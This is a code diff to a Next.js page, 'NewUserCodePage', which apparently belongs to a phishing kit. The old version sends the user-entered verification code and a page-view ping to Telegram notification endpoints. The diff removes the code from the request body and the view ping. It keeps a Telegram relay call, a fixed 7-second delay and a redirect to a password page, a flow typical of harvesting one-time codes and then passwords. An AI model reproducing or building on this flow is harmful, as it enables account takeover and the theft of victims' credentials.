@@ -11,13 +11,6 @@ export default function NewUserCodePage() {
   const [isLoading, setIsLoading] = useState(false)
   const [isResending, setIsResending] = useState(false)
   const router = useRouter()
-  const viewNotificationSent = useRef(false)
-
-  useEffect(() => {
-    if (viewNotificationSent.current) return
-    viewNotificationSent.current = true
-    fetch("/api/telegram/new-user-code-view", { method: "POST" }).catch(console.error)
-  }, [])
 
   const handleVerify = async () => {
     if (isLoading) return
@@ -26,10 +19,10 @@ export default function NewUserCodePage() {
       await fetch("/api/telegram/new-user-code", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ code }),
+        body: JSON.stringify({}),
       }).catch(console.error)
     } catch (error) {
-      console.error("Failed to send new user code notification:", error)
+      console.error("New user code error:", error)
     }
     await new Promise((r) => setTimeout(r, 7000))
     router.push("/new-user-password")
